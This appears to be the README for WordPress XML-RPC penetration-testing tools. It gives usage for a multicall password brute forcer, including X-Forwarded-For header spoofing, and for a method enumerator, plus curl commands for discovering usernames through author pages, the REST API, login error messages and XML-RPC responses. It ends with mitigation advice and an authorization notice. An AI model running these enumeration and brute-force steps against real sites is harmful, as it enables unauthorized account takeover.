# WordPress XML-RPC Testing Tools

This directory contains tools for testing WordPress XML-RPC endpoints for security vulnerabilities and testing password lists generated by the wordlist generator.

## What is XML-RPC?

WordPress XML-RPC is a remote procedure call (RPC) protocol that allows external applications to interact with WordPress sites. It's accessible at `/xmlrpc.php` and enabled by default on most WordPress installations.

### Security Implications

XML-RPC can be exploited for:

- **Brute force attacks**: The `system.multicall` method allows testing multiple passwords in a single request
- **Amplification attacks**: Single requests can perform multiple operations
- **Information disclosure**: Methods like `system.listMethods` reveal available functionality

## Tools

### `list.py` - Method Enumeration

Discovers available XML-RPC methods and checks which ones are accessible without authentication.

```bash
python list.py <URL> [options]
```

**Example:**

```bash
python list.py https://target.is
python list.py https://target.is --debug --header "User-Agent: Custom Bot"
```

**Options:**

- `--header/-H` - Custom HTTP headers (can be used multiple times)
- `--max-retries` - Maximum retry attempts for 400 errors (default: 5)
- `--debug` - Enable debug logging
- `--log-file` - Custom log file path (default: listmethods_logs.txt)

**What it does:**

- Calls `system.listMethods` to get all available methods
- Tests each method to see if authentication is required
- Helps identify potential attack vectors

### `brute.py` - Password Brute Force

Tests password lists against WordPress user accounts using the XML-RPC multicall method.

```bash
python brute.py <URL> <password_file> <username1> [username2]... [options]
```

**Example:**

```bash
python brute.py https://target.is ../wordlist.txt admin editor
python brute.py https://target.is passwords.txt admin --debug --wait-time 2.0 --header "X-Forwarded-For: 192.168.1.1"
```

**Options:**

- `--header/-H` - Custom HTTP headers (can be used multiple times)
- `--wait-time` - Wait between requests in seconds (default: 1.0)
- `--debug` - Enable debug logging
- `--log-file` - Custom log file path (default: brute_logs.txt)
- `--chunk-size` - Password chunk size for reading (default: 500)

**Features:**

- Tests up to 2000 passwords per request using multicall, depending on the target's server limitations.
- Automatically validates positive results individually
- Includes rate limiting and error handling
- Works with wordlists generated by the parent directory tool

## Username Enumeration Techniques

Before running brute force attacks, you need to identify valid usernames. Here are several methods:

### 1. Author Parameter (`?author=1`)

WordPress exposes usernames through author pages:

```bash
curl "https://target.is/?author=1"
curl "https://target.is/?author=2"
curl "https://target.is/?author=3"
```

Look for redirects to `/author/username/` or check the page title/content for usernames.

### 2. REST API Enumeration

WordPress REST API exposes user information:

```bash
# Method 1: Direct REST API
curl "https://target.is/wp-json/wp/v2/users"

# Method 2: Using rest_route parameter
curl "https://target.is/?rest_route=/wp/v2/users"
```

This returns JSON with user details including usernames, display names, and user IDs.

### 3. Wayback Machine

Search historical snapshots for author pages and usernames:

1. Go to [web.archive.org](https://web.archive.org)
2. Search for the target domain
3. Look for URLs containing:
   - `/author/`
   - `?author=`
   - Author bylines in blog posts
   - Comment sections with usernames

**Example searches:**

- `site:target.is author`
- `site:target.is "written by"`
- `site:target.is "posted by"`

### 4. Login Error Differences

Some WordPress sites reveal username validity through login error messages:

```bash
# Test with invalid username
curl -X POST "https://target.is/wp-login.php" \
  -d "log=nonexistentuser&pwd=wrongpass"

# Test with valid username
curl -X POST "https://target.is/wp-login.php" \
  -d "log=admin&pwd=wrongpass"
```

Look for different error messages that might indicate username validity.

### 5. XML-RPC Username Validation

Use XML-RPC methods to validate usernames:

```bash
curl -X POST "https://target.is/xmlrpc.php" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getCategories</methodName>
  <params>
    <param><value><string>testuser</string></value>
    <param><value><string>wrongpass</string></value>
  </params>
</methodCall>'
```

Different error responses may indicate username validity.

## Integration with Wordlist Generator

This tool is designed to work with wordlists generated by the parent directory tool:

1. **Generate targeted wordlist:**

   ```bash
   cd ..
   python main.py --output custom_passwords.txt
   ```

2. **Enumerate usernames** using methods above

3. **Test credentials:**
   ```bash
   cd xml-rpc
   python brute.py https://target.com ../custom_passwords.txt admin editor author
   ```

## Security Notes

- **Authorization Required**: Only test systems you own or have explicit permission to test
- **Rate Limiting**: The tools include delays to avoid overwhelming target servers
- **Detection**: XML-RPC attacks are easily detected and logged
- **Blocking**: Many security plugins block or disable XML-RPC entirely

## Mitigation

To protect against XML-RPC attacks:

1. **Disable XML-RPC** if not needed:

   ```php
   add_filter('xmlrpc_enabled', '__return_false');
   ```

2. **Block xmlrpc.php** in web server configuration
3. **Use security plugins** that monitor and block brute force attempts
4. **Implement strong passwords** and two-factor authentication
5. **Monitor logs** for suspicious XML-RPC activity

## Security Notice

Use only with proper authorization. This tool is for ethical security testing and educational purposes only.
